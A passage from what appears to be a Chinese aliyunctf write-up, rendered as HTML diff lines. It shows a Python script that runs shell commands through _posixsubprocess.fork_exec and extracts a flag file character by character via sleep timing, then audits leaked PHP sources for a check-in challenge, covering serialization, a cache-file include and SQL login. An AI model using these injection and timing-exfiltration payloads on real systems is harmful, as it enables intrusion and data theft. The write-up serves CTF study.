+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>  <span class="c1"># 假设每行最多 7 个字符</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>  <span class="c1"># 限制字符范围为字母和数字</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;code&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;import os
+</span></span></span><span class="line"><span class="cl"><span class="s1">import _posixsubprocess
+</span></span></span><span class="line"><span class="cl"><span class="s1">_posixsubprocess.fork_exec([&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;if [ $(cat /flag-9* | awk NR==</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1"> | cut -c </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s1">) = &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">&#39; ];then sleep 2; fi&#34;], [b&#34;/bin/sh&#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆出来：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aliyunctf{076d4662-656b-4889-
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>长度不够，再改点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>  <span class="c1"># 假设有 4 行</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;第</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">行&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>  <span class="c1"># 假设每行最多 7 个字符</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>  <span class="c1"># 限制字符范围为字母和数字</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;code&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;import os
+</span></span></span><span class="line"><span class="cl"><span class="s1">import _posixsubprocess
+</span></span></span><span class="line"><span class="cl"><span class="s1">_posixsubprocess.fork_exec([&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;if [ $(cat /flag-9* | awk NR==</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1"> | cut -c </span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s1">) = &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">&#39; ];then sleep 2; fi&#34;], [b&#34;/bin/sh&#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后再爆出来：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ac30-77bb8c19fefa}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接拼接到交就行了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aliyunctf{076d4662-656b-4889-ac30-77bb8c19fefa}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>——————</p>
+<h3 id="打卡ok">打卡OK
+</h3><p>没写好的系统怎么会打卡ok呢~</p>
+<p>——————</p>
+<p>开题，跳转到了login.php，后端是php，扫目录：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502231219162.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250223121945852"
+	
+	
+></p>
+<p>在<code>index.php~</code>文件中拿到了index.php文件源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span><span class="o">!=</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(</span><span class="se">\&#34;</span><span class="s2">Please login!</span><span class="se">\&#34;</span><span class="s2">);window.location.href=</span><span class="se">\&#34;</span><span class="s2">./login.php</span><span class="se">\&#34;</span><span class="s2">;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">include &#39;./cache.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">$check=new checkin();
+</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_POST[&#39;reason&#39;])){
+</span></span></span><span class="line"><span class="cl"><span class="err">    if(isset($_GET[&#39;debug_buka&#39;]))
+</span></span></span><span class="line"><span class="cl"><span class="err">    {
+</span></span></span><span class="line"><span class="cl"><span class="err">        $time=date($_GET[&#39;debug_buka&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="err">    }else{
+</span></span></span><span class="line"><span class="cl"><span class="err">        $time=date(&#34;Y-m-d H:i:s&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">    $arraya=serialize(array(&#34;name&#34;=&gt;$_SESSION[&#39;username&#39;],&#34;reason&#34;=&gt;$_POST[&#39;reason&#39;],&#34;time&#34;=&gt;$time,&#34;background&#34;=&gt;&#34;ok&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="err">    $check-&gt;writec($_SESSION[&#39;username&#39;].&#39;-&#39;.date(&#34;Y-m-d&#34;),$arraya);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_GET[&#39;check&#39;])){
+</span></span></span><span class="line"><span class="cl"><span class="err">    $cachefile = &#39;/var/www/html/cache/&#39; . $_SESSION[&#39;username&#39;].&#39;-&#39;.date(&#34;Y-m-d&#34;). &#39;.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    if (is_file($cachefile)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        $data=file_get_contents($cachefile);
+</span></span></span><span class="line"><span class="cl"><span class="err">        $checkdata = unserialize(str_replace(&#34;&lt;?php exit;//&#34;, &#39;&#39;, $data));
+</span></span></span><span class="line"><span class="cl"><span class="err">        $check=&#34;/var/www/html/&#34;.$checkdata[&#39;background&#39;].&#34;.php&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">        include &#34;$check&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }else{
+</span></span></span><span class="line"><span class="cl"><span class="err">        include &#39;error.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>还是显示必须要登录，但是在登录框有一个code，不知道是干什么的，也爆破不了。后面发现其实可以任意读取文件源码，类似<code>xxxx.php~</code>这样来读取文件内容，部分文件的文件泄露，下面贴一下文件内容荣，这里就只保留php代码了：</p>
+<p>login.php文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;web&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;web&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">&#34;web&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;连接失败: &#34;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;./pass.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span><span class="o">=</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$endpass</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$code</span><span class="o">.</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select password from users where username=&#39;</span><span class="si">$username</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$endpass</span><span class="o">==</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(</span><span class="se">\&#34;</span><span class="s2">Welcome </span><span class="si">$username</span><span class="s2">!</span><span class="se">\&#34;</span><span class="s2">);window.location.href=</span><span class="se">\&#34;</span><span class="s2">./index.php</span><span class="se">\&#34;</span><span class="s2">;&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(</span><span class="se">\&#34;</span><span class="s2">错误</span><span class="se">\&#34;</span><span class="s2">);&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>pass.php文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">mypass</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$charactersLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkpass</span><span class="p">(</span><span class="nv">$plain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateRandomString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$salt</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$salt</span> <span class="o">.</span> <span class="nv">$plain</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$salt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>cache.php文件内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">myCache</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">writecache</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/cache/&#39;</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cachedata</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit;//&#34;</span> <span class="o">.</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$cachedata</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">checkin</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">writec</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$wr</span><span class="o">=</span><span class="k">new</span> <span class="nx">myCache</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$wr</span><span class="o">-&gt;</span><span class="na">writecache</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>审计代码，可以发现在index.php文件中，存在一个文件包含的操作另一个php文件的操作。</p>
+<p>简单说说index.php文件逻辑，序列化操作，是序列化了一个数组，案后将其存放在一个文件中（集合index.php和cache.php文件来看），可以简单写一个代码来看一下写文件的内容是什么：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arraya</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc&#34;</span><span class="p">,</span><span class="s2">&#34;reason&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;123&#34;</span><span class="p">,</span><span class="s2">&#34;time&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;11112&#34;</span><span class="p">,</span><span class="s2">&#34;background&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;ok&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="o">.</span><span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cachedata</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit;//&#34;</span> <span class="o">.</span> <span class="nv">$arraya</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$cachedata</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>文件fupanc-2025-02-23.php文件内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">exit</span><span class="p">;</span><span class="c1">//a:4:{s:4:&#34;name&#34;;s:6:&#34;fupanc&#34;;s:6:&#34;reason&#34;;s:3:&#34;123&#34;;s:4:&#34;time&#34;;s:5:&#34;11112&#34;;s:10:&#34;background&#34;;s:2:&#34;ok&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是序列化数据，只是前面插入了一段php文件，估计是防止直接利用这个文件，死亡exit也绕不了，文件名不可控：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">file</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/cache/&#39;</span> <span class="o">.</span> <span class="o">$</span><span class="n">name</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后看其他index.php的其他代码，可以读出文件读取操作和反序列化操作，还有个字符串替换操作：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
